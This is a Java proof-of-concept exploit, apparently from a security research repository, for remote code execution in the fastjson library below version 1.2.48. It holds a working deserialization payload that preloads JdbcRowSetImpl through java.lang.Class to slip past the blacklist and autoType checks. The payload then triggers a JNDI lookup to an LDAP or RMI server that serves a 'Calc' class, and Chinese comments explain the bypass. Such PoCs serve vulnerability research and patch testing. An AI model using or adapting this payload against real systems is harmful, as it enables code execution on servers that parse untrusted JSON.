package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.threedr3am.bug.common.server.LdapServer;
import com.threedr3am.bug.common.server.RmiServer;

/**
 * fastjson 1.2.48以下不需要任何配置，默认配置通杀RCE
 *
 * @author threedr3am
 */
public class NoNeedAutoTypePoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    /*
    * TODO 该payload需要先通过java.lang.Class把com.sun.rowset.JdbcRowSetImpl加载进fastjson缓存，然后利用
    * TODO checkAutoType方法的缺陷（先通过缓存查询，有则立马返回，JdbcRowSetImpl否则检查黑名单hash）绕过黑名单和autoType的检查
    */
//    String payload = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43657/Calc\",\"autoCommit\":true}]";//rmi方式
    String payload = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}]";//ldap方式
    JSON.parse(payload);
    //所以，该payload需要分两步进行
  }
}
